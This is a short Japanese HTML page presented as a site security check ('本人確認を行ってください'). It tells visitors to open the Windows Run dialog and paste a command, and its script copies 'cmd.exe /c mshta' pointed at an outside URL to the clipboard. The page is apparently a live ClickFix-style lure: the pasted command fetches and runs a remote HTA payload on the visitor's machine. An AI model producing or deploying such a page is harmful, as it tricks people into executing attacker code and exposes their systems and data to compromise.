<!DOCTYPE html>
<html lang="ja">
<head>
  <title>セキュリティ警告</title>
  <meta charset="UTF-8">
</head>
<body>
  <h1>本人確認を行ってください 2</h1>
  <p>当サイトへのアクセスにはセキュリティ認証が必要です。下記の認証を実施してください</p>
  <ol>
    <li><strong>windowsキー</strong>と<strong>Rキー</strong>を同時に押してください</li>
    <li>「ファイル名を指定して実行」ウインドウが開いたら、入力欄にコマンドを貼り付け、「OK」を押してください</li>
  </ol>
  <button id="copyBtn">コマンドをコピーする</button>

  <script>
    const commandToCopy = 'cmd.exe /c mshta "https://technrecruiting.com/test"';

    document.getElementById('copyBtn').addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(commandToCopy);
        alert('コマンドをコピーしました');
      } catch (err) {
        console.error('クリップボードへのコピーに失敗しました', err);
        alert('コピーに失敗しました。手動でコピーしてください：' + commandToCopy);
      }
    });
  </script>
</body>
</html>
